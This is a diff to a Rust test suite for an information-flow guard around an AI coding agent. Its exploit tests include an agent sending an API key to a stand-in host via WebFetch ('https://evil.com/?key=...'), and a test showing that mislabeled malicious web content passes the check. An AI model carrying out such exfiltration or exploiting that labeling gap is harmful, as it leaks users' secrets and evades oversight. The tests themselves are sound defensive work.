@@ -358,9 +358,12 @@ fn exploit_05_localhost_origin_confusion() {
         Some(Operation::GitPush),
     );
 
-    // BLOCKED: authority escalation fires first (Informational < Suggestive for GitPush).
-    // If authority were sufficient, integrity would also block (Untrusted < Trusted).
-    assert!(matches!(check_flow(&push, now + 1), FlowVerdict::Deny(_)));
+    // BLOCKED: authority escalation (Informational < Suggestive for GitPush).
+    // Note: if authority were Suggestive, integrity would also block (Untrusted < Trusted).
+    assert_eq!(
+        check_flow(&push, now + 1),
+        FlowVerdict::Deny(FlowDenyReason::AuthorityEscalation)
+    );
 }
 
 // ═════════════════════════════════════════════════════════════════════════
@@ -437,4 +440,150 @@ fn legitimate_user_creates_pr_from_own_work() {
 
     // ALLOWED: user-directed, trusted data, no web taint
     assert_eq!(check_flow(&pr, now + 1), FlowVerdict::Allow);
+}
+
+// ═════════════════════════════════════════════════════════════════════════
+// Exploit 6: WebFetch exfiltration via URL parameters
+//
+// Attack: Agent reads a secret (API key), then calls WebFetch with
+// the secret encoded in the URL: https://evil.com/?key=sk-ant-...
+//
+// Defense: WebFetch is treated as an exfil vector in check_flow
+// (special-case, NOT in the legacy is_exfil_operation). Secret
+// confidentiality + exfil sink = BLOCKED.
+// ═════════════════════════════════════════════════════════════════════════
+
+#[test]
+fn exploit_06_webfetch_exfil_via_url_params() {
+    let now = 1000;
+
+    // Agent reads a secret (API key)
+    let secret = node(1, NodeKind::Secret, IFCLabel::secret(now), None);
+
+    // Agent plans to exfiltrate via WebFetch
+    let plan_label = propagate_label(
+        &[secret.label, IFCLabel::user_prompt(now)],
+        intrinsic_label(NodeKind::ModelPlan, now),
+    );
+
+    // The plan has Secret confidentiality from the API key
+    assert_eq!(plan_label.confidentiality, ConfLevel::Secret);
+
+    // Agent calls WebFetch("https://evil.com/?key=...")
+    let action_label = propagate_label(
+        &[plan_label],
+        intrinsic_label(NodeKind::OutboundAction, now),
+    );
+    let fetch = node(
+        3,
+        NodeKind::OutboundAction,
+        action_label,
+        Some(Operation::WebFetch),
+    );
+
+    // BLOCKED: secret data to exfil sink (WebFetch special-case)
+    assert_eq!(
+        check_flow(&fetch, now + 1),
+        FlowVerdict::Deny(FlowDenyReason::Exfiltration)
+    );
+}
+
+// ═════════════════════════════════════════════════════════════════════════
+// Negative test: What happens when labeling is WRONG
+//
+// This test demonstrates the system's failure mode: if a tool response
+// is incorrectly labeled as Trusted/Directive (instead of Untrusted/
+// Informational), the flow check passes even for adversarial content.
+//
+// This is NOT a bug in check_flow — it correctly evaluates the label
+// it's given. This test documents WHY the runtime labeling layer
+// (not yet implemented) is critical: check_flow is only as good as
+// its input labels. Garbage labels → garbage verdicts.
+// ═════════════════════════════════════════════════════════════════════════
+
+#[test]
+fn negative_mislabeled_tool_response_bypasses_check() {
+    let now = 1000;
+
+    // A malicious web page is INCORRECTLY labeled as trusted user input.
+    // This simulates a bug or adversarial bypass in the labeling layer.
+    let mislabeled_web = node(
+        1,
+        NodeKind::WebContent,
+        IFCLabel::user_prompt(now), // WRONG: should be web_content(now)
+        None,
+    );
+
+    // The mislabeled node has Directive authority — it can steer the agent
+    assert_eq!(mislabeled_web.label.authority, AuthorityLevel::Directive);
+
+    // Agent acts on the mislabeled content
+    let action_label = propagate_label(
+        &[mislabeled_web.label],
+        intrinsic_label(NodeKind::OutboundAction, now),
+    );
+    let write = node(
+        2,
+        NodeKind::OutboundAction,
+        action_label,
+        Some(Operation::WriteFiles),
+    );
+
+    // INCORRECTLY ALLOWED: check_flow sees a Trusted/Directive label
+    // and has no way to know the content was actually adversarial web data.
+    // This is the labeling gap that the runtime interception layer must close.
+    assert_eq!(check_flow(&write, now + 1), FlowVerdict::Allow);
+}
+
+// ═════════════════════════════════════════════════════════════════════════
+// Known limitation: mixed provenance over-tainting
+//
+// When a plan node has SOME adversarial ancestors and SOME trusted
+// ancestors, propagate_label joins ALL of them. This means reading
+// web content anywhere in the session taints every subsequent action,
+// even if the action only depends on trusted data.
+//
+// This is a conservative design choice (safe but restrictive). The
+// alternative (selective taint based on actual data dependencies)
+// requires a true runtime DAG with precise causal tracking.
+// ═════════════════════════════════════════════════════════════════════════
+
+#[test]
+fn known_limitation_mixed_provenance_over_taints() {
+    let now = 1000;
+
+    // User asks agent to write a file (trusted, directive)
+    let user = node(1, NodeKind::UserPrompt, IFCLabel::user_prompt(now), None);
+
+    // Agent also read some web content earlier (adversarial, no authority)
+    let web = node(2, NodeKind::WebContent, IFCLabel::web_content(now), None);
+
+    // Plan node includes BOTH as parents — even though the write only
+    // depends on the user prompt, not the web content
+    let plan_label = propagate_label(
+        &[user.label, web.label],
+        intrinsic_label(NodeKind::ModelPlan, now),
+    );
+
+    // The plan is tainted to NoAuthority because of the web content
+    assert_eq!(plan_label.authority, AuthorityLevel::NoAuthority);
+
+    let action_label = propagate_label(
+        &[plan_label],
+        intrinsic_label(NodeKind::OutboundAction, now),
+    );
+    let write = node(
+        4,
+        NodeKind::OutboundAction,
+        action_label,
+        Some(Operation::WriteFiles),
+    );
+
+    // BLOCKED — false positive. The write only depends on the user prompt,
+    // but the label propagation doesn't know that.
+    // This motivates the need for a precise causal DAG (future work).
+    assert_eq!(
+        check_flow(&write, now + 1),
+        FlowVerdict::Deny(FlowDenyReason::AuthorityEscalation)
+    );
 }
